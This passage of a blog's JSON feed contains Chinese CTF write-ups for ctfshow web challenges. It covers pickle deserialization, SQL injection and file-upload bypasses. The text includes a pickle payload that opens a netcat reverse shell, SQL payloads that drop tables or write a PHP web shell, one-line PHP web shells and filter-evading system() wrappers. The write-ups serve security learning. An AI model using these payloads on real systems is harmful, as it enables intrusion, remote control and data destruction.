punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">while</span> flag <span class=\"token keyword\">is</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    a <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>work1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    b <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>work2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    a<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    b<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"web-277-278\"><a class=\"anchor\" href=\"#web-277-278\">#</a> web 277 278</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> pickle</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">'__import__(\"os\").popen(\"nc xxx.xxx.xxx.xxx 4567 -e /bin/sh\").read()'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a<span class=\"token operator\">=</span>A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>test<span class=\"token operator\">=</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/SQL%20%E6%B3%A8%E5%85%A5/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/SQL%20%E6%B3%A8%E5%85%A5/",
            "title": "SQL 注入",
            "date_published": "2022-10-04T14:15:40.000Z",
            "content_html": "<ul>\n<li>\n<p>若对返回值进行过滤</p>\n<ul>\n<li>\n<p>可以在该字段名前加上 <code>hex()</code>  十六进制编码</p>\n</li>\n<li>\n<p>使用 replace 函数，对返回结果进行替换，绕过 waf，得到替换结果后再替换回来</p>\n</li>\n</ul>\n</li>\n<li>\n<p>sql 注入也可以将内容写入到外部文件中，</p>\n<p>如 <code>select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile '/var/www/html/1.php'</code></p>\n<p>为了防止失败，可对 php 语句进行编码 <code>(base64+url)</code></p>\n<p>之后访问 1.php，可以发现成功，然后使用蚁剑连接，进行数据操作，然后新建数据库 (信息在根目录下 <code>api</code>  下的 <code>config.php</code>  文件中)</p>\n<p>之后找到 flag</p>\n</li>\n<li>\n<p>如果过滤 sql 语句中的某个值，如 <code>username=flag</code> ，而 flag 被过滤，那么可以使用 <code>like+通配符</code> 的方法，如 <code>like '%fla%'</code></p>\n<p>其中 <code>%</code>  匹配任意个字符， <code>_</code> 匹配一个字符，同样也可以使用十六进制编码</p>\n<p>如 <code>select id,username,password from users where username=0x666c6167;</code>  也是可以的，查询出 <code>username='flag'</code>  的情况</p>\n<p>或者用 <code>base64</code>  编码</p>\n</li>\n<li>\n<p>where 被过滤可以使用 having，同 where 用法</p>\n</li>\n<li>\n<p>若 ban 了数字，那么可以使用 <code>true，false</code>  来代替 <code>1 和 0</code> ，然后利用加法构建任意数字，接着利用 <code>concat</code>  函数拼接字符串，从而生成无数字的语句的 (但实际上包含语句)，如</p>\n<p><code>select username,password from users where id=concat(true,true);</code></p>\n<p>等价于 <code>select username,password from users where id='11';</code></p>\n</li>\n<li>\n<p>对于 select 的查询语句</p>\n<p><code>select count(*) from users where username='8' or 'a23';</code></p>\n<p>返回结果是 0</p>\n<p><code>select count(*) from users where username='8' or '1a';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '1';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '0';</code></p>\n<p>返回结果是 0</p>\n<p>那么也就是说，在 or 语句中，0，字母开头的为非，数字开头的为正</p>\n<p>可利用该特性进行 SQL 注入</p>\n</li>\n<li>\n<p>sql 语句的查询机制</p>\n</li>\n<li>\n<p>如 sql 语句 <code>select username,password from users where username='flag';</code></p>\n<p>它将会返回 <code>username</code>  为 <code>flag</code>  的值的数据</p>\n<p>但如果此时将 <code>username='flag'</code>  换为 <code>username=0</code>  后，是否还能查到 flag 呢？</p>\n<p>答案是肯定的，这是因为，这里的等于是弱等于，</p>\n</li>\n<li>\n<p>substr 如果被禁了，可以使用 left 代替，其中 left 只有两个参数，第一个为字符串，第二个为个数，即从最左端开始</p>\n<p>如 <code>select left(&quot;abc&quot;,2);</code>  返回 <code>ab</code></p>\n<p>或者也可以使用 <code>lpad</code> ，其有三个参数</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>LPAD<span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span>len<span class=\"token punctuation\">,</span>padstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">Returns</span> the string str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">left</span><span class=\"token operator\">-</span>padded <span class=\"token keyword\">with</span> the string padstr <span class=\"token keyword\">to</span> a length <span class=\"token keyword\">of</span> len characters<span class=\"token punctuation\">.</span> <span class=\"token keyword\">If</span> str <span class=\"token operator\">is</span> longer than len<span class=\"token punctuation\">,</span> the <span class=\"token keyword\">return</span> <span class=\"token keyword\">value</span> <span class=\"token operator\">is</span> shortened <span class=\"token keyword\">to</span> len characters<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token string\">'??hi'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token string\">'h'</span></pre></td></tr></table></figure><p>那么可以 <code>lpad(&quot;abc&quot;,2,&quot;&quot;);</code>  达到与 left 同样效果</p>\n</li>\n<li>\n<p>时间盲注</p>\n<p><strong>sleep(3)</strong> 直截了当的时间盲注</p>\n<p><strong>benchmark()</strong></p>\n<p>The BENCHMARK() function executes the expression expr repeatedly count times. It may be used to time how quickly MySQL processes the expression. The result value is 0, or NULL for inappropriate arguments such as a NULL or negative repeat count.</p>\n<p><strong>rlike</strong> 正则匹配</p>\n<p><strong>多次查询排序</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span></pre></td></tr></table></figure></li>\n</ul>\n<h1 id=\"web-195\"><a class=\"anchor\" href=\"#web-195\">#</a> web 195</h1>\n<p>查询语句</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">&#125;</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>返回逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\'|\\\"|select|union|or|and|\\x26|\\x7c|file|into/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"登陆成功 flag is <span class=\"token interpolation\"><span class=\"token variable\">$flag</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以使用修改表的方法</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">update</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_user<span class=\"token punctuation\">`</span></span><span class=\"token keyword\">set</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><p>将密码重置为 1</p>\n<h1 id=\"web-197\"><a class=\"anchor\" href=\"#web-197\">#</a> web 197</h1>\n<p>查询语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select pass from ctfshow_user where username = &#123;$username&#125;;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>返回逻辑</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/\\*|\\#\\-|\\x23|\\'|\\\"|union|or|and|\\x26|\\x7c|file|into|select|update|set//i'</span><span class=\"token punctuation\">,</span>$username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>&#123;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token keyword\">row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">=</span> $password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"登陆成功 flag is $flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>&#125;</pre></td></tr></table></figure><p>在这一题中，与前面相比过滤了 update，不能更新，分号还是可以用，即堆叠注入还是可以用，所以不妨直接删除表，然后创建相同名字、字段的表，而数据自己设置</p>\n<p>因此 payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">;</span><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">insert</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">value</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"web-198\"><a class=\"anchor\" href=\"#web-198\">#</a> web 198</h1>\n<p>相比于 197 而言，将 <code>drop</code>  和 <code>create</code>  过滤了</p>\n<p>这里可以使用交换列的方法 (前提是知道用户名是什么), 因为在交换了两列之后，查询语句就变为查询原来的 <code>pass</code>  列，而匹配的密码为原来的 <code>username</code>  列，而 <code>username</code>  是知道的，那么即可拿到 flag</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "title": "文件上传",
            "date_published": "2022-10-04T14:14:40.000Z",
            "content_html": "<h1 id=\"情况\"><a class=\"anchor\" href=\"#情况\">#</a> 情况</h1>\n<ul>\n<li>\n<p>仅仅有前端验证，将前端代码删去一些</p>\n</li>\n<li>\n<p>后端仅验证后缀，改后缀</p>\n</li>\n<li>\n<p>后端仅验证 <code>content-type</code> ，改为可以上传的内容类型</p>\n</li>\n<li>\n<p>后端验证内容头，输入一个要求上传格式的内容头</p>\n</li>\n<li>\n<p>后端验证文件内容，如 <code>php</code>  过滤，可以使用短标签</p>\n</li>\n<li>\n<p>用户配置文件可以上传，采用 <code>auto_append_file=1.txt</code> ，(前提是有默认 <code>index.php</code>  可以打开) 然后在 <code>1.txt</code>  内容进行控制</p>\n</li>\n<li>\n<p>内容不允许有方括号，即普通的一句话木马不能上传，可以将方括号改为大括号</p>\n</li>\n<li>\n<p>一句话木马也可写成 <code>&lt;?php eval (array_pop ($_POST));?&gt;</code> , 同样也可</p>\n</li>\n<li>\n<p>过滤括号可以使用文件包含的，因为文件包含可以不写括号</p>\n</li>\n<li>\n<p>如果对某一字符串进行过滤，可以采用分开写的方式绕过，如日志包含过滤了 log，那么可以写成 <code>&lt;?=include '/var/l'.'og/nginx/access.l'.'og?&gt;</code></p>\n</li>\n<li>\n<p>空格过滤，可以使用换行代替（十六进制下用 <code>0d</code> ）</p>\n</li>\n<li>\n<p>过滤点号后，由于此时不能包含任何一个带点的文件 (如 log), 那么此时也可以使用远程 url 包含，先上传一个 <code>.user.ini</code>  自动加载没有点作为名字的文件，然后在该文件上传一个远程包含 url (其中 url 有一句话木马，该 url 为常地址不带点)，那么就可以 rce 了；另外也可以使用 session 包含竞争</p>\n</li>\n<li>\n<p>若无法上传出配置文件以外的文件 (即删除)，可以在配置文件中直接远程包含文件 (url)</p>\n</li>\n<li>\n<p>PNG 二次渲染</p>\n</li>\n<li>\n<p>jpg 二次渲染</p>\n</li>\n<li>\n<p>上传 <code>.htaccess</code>  文件，将某类型文件作为 php 文件读取</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>AddType application&#x2F;x-httpd-php .png</pre></td></tr></table></figure><p>或者</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;FilesMatch &quot;png&quot;&gt; </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application&#x2F;x-httpd-php </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;&#x2F;FilesMatch&gt;</pre></td></tr></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[cmd]);&lt;&#x2F;script&gt;</pre></td></tr></table></figure></li>\n<li>\n<p>xxxxxxxxxx ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p><strong>web 167-170</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"s#y#s#t#e#m\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1s'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ystem'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token 